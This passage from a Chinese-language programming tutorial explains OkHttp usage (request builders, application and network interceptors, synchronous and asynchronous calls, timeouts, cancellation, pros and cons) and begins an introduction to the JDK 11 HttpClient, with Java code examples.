<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是推荐的实践：创建一个单例、线程安全的OkHttpClient实例</span></span><br><span class="line"><span class="comment">// 这个实例内部管理了连接池和线程池，复用它可以获得最佳性能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">HttpClientSingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">        <span class="comment">// 这里可以进行全局配置，如超时、拦截器等</span></span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> OkHttpClient <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> client;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在后续示例中，我们将通过 HttpClientSingleton.getInstance() 获取客户端</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-流式API（Fluent-API）构建请求"><a href="#2-1-流式API（Fluent-API）构建请求" class="headerlink" title="2.1 流式API（Fluent API）构建请求"></a>2.1 流式API（Fluent API）构建请求</h3><p>OkHttp的<code>Request.Builder</code>提供了极其流畅和可读的API来构建不可变的<code>Request</code>对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClientSingleton.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：构建一个带Header的GET请求</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">getRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">    .url(<span class="string">&quot;https://api.github.com/users/square&quot;</span>)</span><br><span class="line">    .header(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;My-OkHttp-App&quot;</span>)</span><br><span class="line">    .addHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/vnd.github.v3+json&quot;</span>) <span class="comment">// addHeader允许添加同名Header</span></span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：构建一个POST JSON请求</span></span><br><span class="line"><span class="type">MediaType</span> <span class="variable">JSON</span> <span class="operator">=</span> MediaType.get(<span class="string">&quot;application/json; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonBody</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;key\&quot;:\&quot;value\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">RequestBody</span> <span class="variable">postBody</span> <span class="operator">=</span> RequestBody.create(jsonBody, JSON);</span><br><span class="line"></span><br><span class="line"><span class="type">Request</span> <span class="variable">postRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">    .url(<span class="string">&quot;https://httpbin.org/post&quot;</span>)</span><br><span class="line">    .post(postBody)</span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：构建一个表单提交请求</span></span><br><span class="line"><span class="type">RequestBody</span> <span class="variable">formBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FormBody</span>.Builder()</span><br><span class="line">    .add(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;testuser&quot;</span>)</span><br><span class="line">    .addEncoded(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;a&amp;b=c&quot;</span>) <span class="comment">// addEncoded会处理特殊字符的URL编码</span></span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line"><span class="type">Request</span> <span class="variable">formRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">    .url(<span class="string">&quot;https://httpbin.org/post&quot;</span>)</span><br><span class="line">    .post(formBody)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-自动连接池与HTTP-2支持"><a href="#2-2-自动连接池与HTTP-2支持" class="headerlink" title="2.2 自动连接池与HTTP&#x2F;2支持"></a>2.2 自动连接池与HTTP&#x2F;2支持</h3><p>OkHttp的一大优势是其智能的默认配置，开发者无需手动配置即可获得高性能。</p>
<ul>
<li><strong>自动连接池</strong>: <code>OkHttpClient</code>默认创建一个<code>ConnectionPool</code>，其默认配置为：最多保持5个空闲连接，每个空闲连接的存活时间为5分钟。这对于大多数应用来说已经足够。</li>
<li><strong>自动HTTP&#x2F;2支持</strong>: 当你向一个支持HTTP&#x2F;2的HTTPS服务器发起请求时，OkHttp会通过TLS的**ALPN（应用层协议协商）**扩展，<strong>自动、透明地</strong>将协议升级到HTTP&#x2F;2。开发者完全无需关心这个过程，但能享受到HTTP&#x2F;2多路复用带来的巨大性能提升，尤其是在并发请求多个资源时。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你无需任何特殊配置，OkHttp默认就会为你做这些</span></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClientSingleton.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当你执行这个请求时，如果https://google.com支持HTTP/2，OkHttp会自动使用HTTP/2</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://google.com&quot;</span>).build();</span><br><span class="line"><span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">    <span class="comment">// 你可以通过response.protocol()来验证使用的协议</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Protocol used: &quot;</span> + response.protocol()); <span class="comment">// 可能会打印 h2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-3-拦截器详解"><a href="#2-3-拦截器详解" class="headerlink" title="2.3 拦截器详解"></a>2.3 拦截器详解</h3><h4 id="2-3-1-应用拦截器-addInterceptor"><a href="#2-3-1-应用拦截器-addInterceptor" class="headerlink" title="2.3.1 应用拦截器 (addInterceptor)"></a>2.3.1 应用拦截器 (<code>addInterceptor</code>)</h4><p>它作用于用户代码和OkHttp核心逻辑之间，观察的是最“原始”的意图。</p>
<p><strong>示例：添加一个通用的认证头</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AuthInterceptor</span> <span class="keyword">implements</span> <span class="title class_">Interceptor</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String authToken;</span><br><span class="line"></span><br><span class="line">    AuthInterceptor(String token) &#123;</span><br><span class="line">        <span class="built_in">this</span>.authToken = token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Response <span class="title function_">intercept</span><span class="params">(Chain chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Request</span> <span class="variable">originalRequest</span> <span class="operator">=</span> chain.request();</span><br><span class="line">        <span class="type">Request</span> <span class="variable">newRequest</span> <span class="operator">=</span> originalRequest.newBuilder()</span><br><span class="line">            .header(<span class="string">&quot;Authorization&quot;</span>, authToken) <span class="comment">// 为原始请求添加认证头</span></span><br><span class="line">            .build();</span><br><span class="line">        <span class="keyword">return</span> chain.proceed(newRequest); <span class="comment">// 继续执行链条</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">authClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">    .addInterceptor(<span class="keyword">new</span> <span class="title class_">AuthInterceptor</span>(<span class="string">&quot;my-secret-token&quot;</span>))</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-3-2-网络拦截器-addNetworkInterceptor"><a href="#2-3-2-网络拦截器-addNetworkInterceptor" class="headerlink" title="2.3.2 网络拦截器 (addNetworkInterceptor)"></a>2.3.2 网络拦截器 (<code>addNetworkInterceptor</code>)</h4><p>它作用于OkHttp核心逻辑和网络之间，能观察到即将发送到网络的真实数据。</p>
<p><strong>示例：计算Gzip压缩效果</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GzipMonitorInterceptor</span> <span class="keyword">implements</span> <span class="title class_">Interceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Response <span class="title function_">intercept</span><span class="params">(Chain chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> chain.request();</span><br><span class="line">        <span class="comment">// 继续执行，获取网络响应</span></span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> chain.proceed(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 网络拦截器能看到网络层的细节</span></span><br><span class="line">        <span class="keyword">if</span> (response.header(<span class="string">&quot;Content-Encoding&quot;</span>, <span class="string">&quot;&quot;</span>).equalsIgnoreCase(<span class="string">&quot;gzip&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">uncompressedLength</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (response.body() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果需要，这里可以解压来获取原始大小，但通常我们只关心压缩后的大小</span></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;Gzip enabled! Compressed size: &quot;</span> </span><br><span class="line">                + response.body().contentLength() + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">networkMonitorClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">    .addNetworkInterceptor(<span class="keyword">new</span> <span class="title class_">GzipMonitorInterceptor</span>())</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-3-3-两者区别与应用场景"><a href="#2-3-3-两者区别与应用场景" class="headerlink" title="2.3.3 两者区别与应用场景"></a>2.3.3 两者区别与应用场景</h4><table>
<thead>
<tr>
<th>特性</th>
<th>应用拦截器 (<code>addInterceptor</code>)</th>
<th>网络拦截器 (<code>addNetworkInterceptor</code>)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>调用次数</strong></td>
<td>每个<code>call</code><strong>仅调用一次</strong>。</td>
<td>每次网络交互<strong>都可能调用</strong>（包括重定向、重试）。</td>
</tr>
<tr>
<td><strong>观察范围</strong></td>
<td>观察用户的原始请求，不关心重定向等中间状态。</td>
<td>观察真实的、即将发送到网络的数据。</td>
</tr>
<tr>
<td><strong><code>chain.connection()</code></strong></td>
<td>始终返回<code>null</code>，因为它在连接建立前运行。</td>
<td>返回当前请求所使用的<code>Connection</code>对象。</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>- 统一添加应用级Header（如<code>Authorization</code>）<br>- 应用级缓存<br>- 记录最终的请求耗时和结果</td>
<td>- 监控网络流量（如Gzip压缩）<br>- 诊断重定向和重试<br>- 添加网络层Header（如<code>Accept-Encoding: gzip</code>）</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-4-同步调用-execute-与异步调用-enqueue"><a href="#2-4-同步调用-execute-与异步调用-enqueue" class="headerlink" title="2.4 同步调用 (execute) 与异步调用 (enqueue)"></a>2.4 同步调用 (<code>execute</code>) 与异步调用 (<code>enqueue</code>)</h3><p><strong>同步调用 <code>execute()</code></strong>：阻塞当前线程，直到响应返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://httpbin.org/get&quot;</span>).build();</span><br><span class="line"><span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line">    </span><br><span class="line">    System.out.println(<span class="string">&quot;Sync Response: &quot;</span> + response.body().string());</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;Sync call failed: &quot;</span> + e.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>异步调用 <code>enqueue()</code></strong>：不阻塞当前线程，在后台线程池中执行，并通过<code>Callback</code>返回结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://httpbin.org/delay/2&quot;</span>).build();</span><br><span class="line">client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Call call, IOException e)</span> &#123;</span><br><span class="line">        <span class="comment">// 在工作线程中回调</span></span><br><span class="line">        System.err.println(<span class="string">&quot;Async call failed: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 在工作线程中回调</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ResponseBody</span> <span class="variable">responseBody</span> <span class="operator">=</span> response.body()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;Async Response: &quot;</span> + responseBody.string());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(<span class="string">&quot;Async call has been enqueued. Main thread is not blocked.&quot;</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-5-多维度超时配置：连接、读取、写入、完整调用"><a href="#2-5-多维度超时配置：连接、读取、写入、完整调用" class="headerlink" title="2.5 多维度超时配置：连接、读取、写入、完整调用"></a>2.5 多维度超时配置：连接、读取、写入、完整调用</h3><p>OkHttp提供了四个维度的超时配置，都在<code>OkHttpClient.Builder</code>上设置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">timeoutClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">    <span class="comment">// 1. 连接超时：与服务器建立TCP连接的超时时间</span></span><br><span class="line">    .connectTimeout(<span class="number">10</span>, TimeUnit.SECONDS)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 读取超时：连接建立后，从服务器读取数据的超时（两次数据包之间的最大间隔）</span></span><br><span class="line">    .readTimeout(<span class="number">30</span>, TimeUnit.SECONDS)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 写入超时：向服务器写入数据的超时</span></span><br><span class="line">    .writeTimeout(<span class="number">15</span>, TimeUnit.SECONDS)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 调用总超时：从 newCall() 开始到获取到完整响应（或失败）的总时间限制。</span></span><br><span class="line">    <span class="comment">// 这是一个全局的“兜底”超时，覆盖了所有其他阶段。</span></span><br><span class="line">    .callTimeout(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-6-请求取消-Call-cancel"><a href="#2-6-请求取消-Call-cancel" class="headerlink" title="2.6 请求取消 (Call.cancel())"></a>2.6 请求取消 (<code>Call.cancel()</code>)</h3><p>可以取消正在等待或执行的调用，这在用户取消操作或页面关闭时非常有用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Call</span> <span class="variable">call</span> <span class="operator">=</span> client.newCall(<span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://httpbin.org/delay/5&quot;</span>).build());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一个线程中异步执行</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Executing long-running call...&quot;</span>);</span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> call.execute();</span><br><span class="line">        System.out.println(<span class="string">&quot;Call finished, response: &quot;</span> + response.code());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// 如果调用被取消，这里会抛出 java.net.SocketException: Socket closed</span></span><br><span class="line">        System.err.println(<span class="string">&quot;Call failed or was cancelled: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在主线程中，等待2秒后取消调用</span></span><br><span class="line">Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Cancelling the call...&quot;</span>);</span><br><span class="line">call.cancel(); </span><br></pre></td></tr></table></figure>

<p>取消是一个尽力而为的操作。如果请求已经完成，取消将不起作用。如果请求正在进行中，OkHttp会通过关闭底层Socket来中断I&#x2F;O操作，导致执行线程抛出<code>IOException</code>。</p>
<hr>
<h2 id="3-优缺点分析-1"><a href="#3-优缺点分析-1" class="headerlink" title="3. 优缺点分析"></a>3. 优缺点分析</h2><h3 id="3-1-优点-1"><a href="#3-1-优点-1" class="headerlink" title="3.1 优点"></a>3.1 优点</h3><h4 id="3-1-1-API简洁、设计现代"><a href="#3-1-1-API简洁、设计现代" class="headerlink" title="3.1.1 API简洁、设计现代"></a>3.1.1 API简洁、设计现代</h4><p>它摒弃了老旧库的沉重感，提供了轻快、直观的开发体验。</p>
<ul>
<li><strong>流畅的构建者模式</strong>: 正如前面示例所示，使用<code>Request.Builder</code>和<code>OkHttpClient.Builder</code>创建对象，代码如行云流水，可读性极高。</li>
<li><strong>不可变性</strong>: <code>Request</code>, <code>Response</code>, <code>OkHttpClient</code>等核心对象都是不可变的。这从根本上杜绝了对象在多线程环境中被意外篡改的可能，是构建健壮并发程序的基石。</li>
<li><strong>简化的资源管理</strong>: <code>try-with-resources(Response response = ...)</code>的模式，结合<code>response.body().string()</code>等方法内部自动关闭流的机制，极大地降低了资源泄漏的风险。开发者只需关注<code>Response</code>对象的关闭，而无需手动处理底层的<code>InputStream</code>。</li>
</ul>
<hr>
<h4 id="3-1-2-性能高效、智能默认"><a href="#3-1-2-性能高效、智能默认" class="headerlink" title="3.1.2 性能高效、智能默认"></a>3.1.2 性能高效、智能默认</h4><p>OkHttp是为性能而生的，它在不做任何配置的情况下，就能提供非常出色的性能。</p>
<ul>
<li><strong>高效的连接池</strong>: OkHttp默认开启并自动管理连接池。它会自动维护到不同主机的连接，并通过HTTP Keep-Alive复用它们，大大减少了延迟。开发者无需像使用Apache HttpClient那样手动配置<code>PoolingHttpClientConnectionManager</code>。</li>
<li><strong>透明的HTTP&#x2F;2支持</strong>: 这是OkHttp的一大杀手级特性。当与支持HTTP&#x2F;2的服务器通信时，OkHttp会通过ALPN自动协商并升级到HTTP&#x2F;2协议。开发者无需编写任何额外代码，就能享受到HTTP&#x2F;2多路复用带来的性能飞跃，这在需要向同一主机发起大量并发请求的微服务场景中优势尤其明显。</li>
<li><strong>自动Gzip压缩</strong>: OkHttp默认会为请求添加<code>Accept-Encoding: gzip</code>头，并在收到Gzip压缩的响应时自动解压。这一切都是透明的，开发者可以以最小的网络流量获取数据。</li>
</ul>
<hr>
<h4 id="3-1-3-强大的拦截器机制"><a href="#3-1-3-强大的拦截器机制" class="headerlink" title="3.1.3 强大的拦截器机制"></a>3.1.3 强大的拦截器机制</h4><p>拦截器是OkHttp的精髓，它提供了一个优雅且极其强大的方式来观察、修改和增强HTTP通信。</p>
<ul>
<li><strong>解耦横切关注点</strong>: 日志、认证、缓存、重试、监控等通用逻辑，都可以通过拦截器实现，与核心业务代码完全分离，使得代码结构更清晰，更易于维护和测试。</li>
<li><strong>高度的灵活性</strong>: 责任链模式赋予了拦截器极大的权力。一个拦截器不仅可以修改请求和响应，甚至可以“短路”整个调用链，直接返回一个缓存的或伪造的响应，这为实现复杂的缓存和Mock策略提供了可能。</li>
<li><strong>清晰的调用分层</strong>: 应用拦截器和网络拦截器的区分，让开发者可以精确地在调用生命周期的不同阶段进行介入，无论是关心最终的业务意图，还是关心每一次真实的网络交互。</li>
</ul>
<hr>
<h3 id="3-2-缺点-1"><a href="#3-2-缺点-1" class="headerlink" title="3.2 缺点"></a>3.2 缺点</h3><h4 id="3-2-1-内置复杂认证支持较少"><a href="#3-2-1-内置复杂认证支持较少" class="headerlink" title="3.2.1 内置复杂认证支持较少"></a>3.2.1 内置复杂认证支持较少</h4><p>OkHttp的设计哲学是保持核心库的轻量和通用，因此它并没有像Apache HttpClient那样内置对所有复杂企业认证方案的直接支持。</p>
<ul>
<li><strong>场景</strong>: 在一些大型企业内部，系统间集成可能需要<strong>NTLM</strong>或**Kerberos (SPNEGO)**认证，这在与Windows域环境（如SharePoint, Exchange, SQL Server Reporting Services）交互时非常常见。</li>
<li><strong>对比Apache HttpClient</strong>: Apache HttpClient为这些认证方案提供了开箱即的支持，通常只需要进行简单的配置即可工作。</li>
<li><strong>OkHttp的解决方案</strong>:<ol>
<li><strong>手动实现</strong>: 你需要使用OkHttp的<code>Authenticator</code>接口。当服务器返回<code>401 Unauthorized</code>并携带<code>WWW-Authenticate</code>头时，OkHttp会调用<code>Authenticator</code>。你需要在<code>authenticate()</code>方法中，手动构造包含正确认证信息的响应头。</li>
<li><strong>依赖第三方库</strong>: 实现NTLM或Kerberos协议的握手逻辑非常复杂。更现实的做法是引入实现了这些逻辑的第三方库（例如，搜索<code>okhttp-ntlm</code>或<code>okhttp-spnego</code>），然后将它们包装在<code>Authenticator</code>或<code>Interceptor</code>中使用。</li>
</ol>
</li>
</ul>
<hr>
<h1 id="四、JDK-11-HttpClient"><a href="#四、JDK-11-HttpClient" class="headerlink" title="四、JDK 11+ HttpClient"></a>四、JDK 11+ HttpClient</h1><p>从Java 11开始，Java平台终于迎来了一个官方的、现代化的HTTP客户端API，它位于<code>java.net.http</code>包下。这个新客户端的诞生，旨在彻底取代老旧的<code>HttpURLConnection</code>，为Java开发者提供一个内置的、功能强大且易于使用的HTTP通信解决方案。</p>
<h2 id="1-简介与动机"><a href="#1-简介与动机" class="headerlink" title="1. 简介与动机"></a>1. 简介与动机</h2><h3 id="1-1-官方出品，替换-HttpURLConnection"><a href="#1-1-官方出品，替换-HttpURLConnection" class="headerlink" title="1.1 官方出品，替换 HttpURLConnection"></a>1.1 官方出品，替换 <code>HttpURLConnection</code></h3><p><code>HttpURLConnection</code> API自JDK 1.1以来就已存在，其设计已经远远落后于现代应用开发的需求。它的同步阻塞模型、繁琐的API、复杂的资源管理以及对现代协议支持的缺失，使其成为Java开发者长期以来的痛点。</p>
<p>为了解决这些问题，Java平台团队经过深思熟虑，决定重新设计一个全新的HTTP客户端。这个新客户端的设计目标非常明确：</p>
<ul>
<li><strong>现代化的API</strong>: 提供简洁、流畅的链式API（Fluent API）和构建者模式，提升开发体验。</li>
<li><strong>异步优先 (Async-First)</strong>: 以<code>CompletableFuture</code>为核心，原生支持非阻塞的异步编程模型，完美契合现代高并发、高吞吐量的服务架构。</li>
<li><strong>支持新协议</strong>: 内置对<strong>HTTP&#x2F;2</strong>和<strong>WebSocket</strong>的开箱即用支持，让开发者能轻松利用新协议带来的性能优势。</li>
<li><strong>简单与强大并存</strong>: 既要易于上手，能够用几行代码完成简单请求，也要有足够的灵活性来处理复杂的场景。</li>
</ul>
<p>这个API并非一蹴而就。它最早在Java 9中以<strong>孵化模块 (Incubator Module)</strong> 的形式（<code>jdk.incubator.httpclient</code>）引入，用于收集社区的反馈。经过Java 9和Java 10两个版本的迭代和打磨，最终在<strong>Java 11中正式成为标准库的一部分</strong>。这个过程确保了其API的稳定性和设计的合理性。</p>
<p>因此，JDK HttpClient的出现，标志着Java平台终于拥有了一个与时代同步的、内置的、现代化的HTTP通信解决方案，正式宣告了<code>HttpURLConnection</code>时代的终结。</p>
<hr>
<h3 id="1-2-无需引入第三方依赖"><a href="#1-2-无需引入第三方依赖" class="headerlink" title="1.2 无需引入第三方依赖"></a>1.2 无需引入第三方依赖</h3><p>作为一个标准的JDK模块，只需要使用Java 11或更高版本的JDK，就可以立即使用它，无需在项目中添加任何额外的Maven或Gradle依赖。</p>
<p>这个特性在以下场景中尤其具有吸引力：</p>
<ul>
